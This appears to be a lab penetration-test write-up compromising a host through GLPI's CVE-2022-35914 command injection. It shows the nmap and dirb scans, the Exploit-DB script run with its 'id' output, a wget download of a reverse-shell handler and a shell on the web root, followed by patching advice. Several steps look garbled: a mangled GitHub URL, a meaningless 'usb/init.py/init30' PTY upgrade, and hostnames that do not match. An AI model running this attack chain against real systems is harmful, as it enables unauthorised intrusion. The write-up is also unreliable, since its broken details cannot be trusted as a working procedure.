# Penetration Testing Write-Up: Target 192.168.54.190

## Summary
A penetration test was conducted against the target IP `192.168.54.190`, leading to the successful compromise of the host via a command injection vulnerability (CVE-2022-35914) in a GLPI instance. A reverse shell was obtained and upgraded to a fully interactive PTY session.

---

## Reconnaissance

### Nmap Scan
The initial scan was performed using Nmap with service detection, OS detection, and aggressive timing.

```bash
nmap -sC -sV -A -T4 -Pn -oA initial 192.168.54.190
```

**Findings:**
- **Port 22/tcp:** OpenSSH 8.4p1 (Debian)
- **Port 80/tcp:** Apache httpd 2.4.56 (Debian)
- **OS:** Linux kernel 4.19 - 5.15
- **Network distance:** 2 hops

### Web Directory Enumeration
Dirb was used to discover accessible directories and files on the web server.

```bash
dirb http://192.168.54.190/
```

**Findings:**
- `http://192.168.54.190/index.php` (200 OK)
- `http://192.168.54.190/server-status` (403 Forbidden)

---

## Vulnerability Identification

Research indicated that the target was running a version of GLPI vulnerable to **CVE-2022-35914**, a command injection vulnerability via a third-party library. A public exploit was available on Exploit-DB (ID: 52023).

---

## Exploitation

### Initial Command Injection
The Python exploit `52023.py` was used to test and exploit the vulnerability.

```bash
python3 52023.py -u http://192.168.54.190/ -c id
```

**Output:**
```
[+] Command output (Return code: 0):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed remote command execution as the `www-data` user.

### Reverse Shell Acquisition
A Python-based reverse shell handler (`pene/ope.py`) was downloaded and used to establish a persistent connection.

```bash
wget https://raw.githubusercontent.com/brighto/pene/ope/refs/heads/main/pene/ope.py
python3 pene/ope.py
```

**Result:**
- Listener started on port 4444
- Reverse shell received from `law-192.168.54.190`
- Shell successfully upgraded to PTY using `usb/init.py/init30`

### Post-Exploration
Once inside the target system, initial exploration revealed the web root directory structure, confirming access to the host's filesystem.

```bash
www-data@raw:/var/www/html$ ls -la
```

**Files observed:**
- `LICENSE-GPL2`
- `LICENSE-LGPL3`
- `html.raw.php`
- `html.raw.README.html`
- `html.raw.README.txt`
- `html.raw.README.TESTCASE.txt`
- `index.php`

---

## Conclusion

The target `192.168.54.190` was successfully compromised due to an unpatched command injection vulnerability (CVE-2022-35914) in the GLPI application. The attack path was:

1. **Reconnaissance:** Identified open ports (SSH, HTTP) and web technologies.
2. **Enumeration:** Discovered the web application and its structure.
3. **Vulnerability Exploitation:** Used a public exploit to achieve remote code execution.
4. **Persistence:** Established a reverse shell and upgraded it to a fully interactive session.

**Recommendations:**
- Update GLPI to the latest version or apply patches for CVE-2022-35914.
- Implement a web application firewall (WAF) to filter malicious payloads.
- Restrict outbound connections from web servers to prevent reverse shells.
- Conduct regular vulnerability assessments and patch management.

---

## References
- [CVE-2022-35914](https://nvd.nist.gov/vuln/detail/CVE-2022-35914)
- [Exploit-DB 52023](https://www.exploit-db.com/exploits/52023)
- [GLPI Security Advisory](https://github.com/glpi-project/glpi/security/advisories)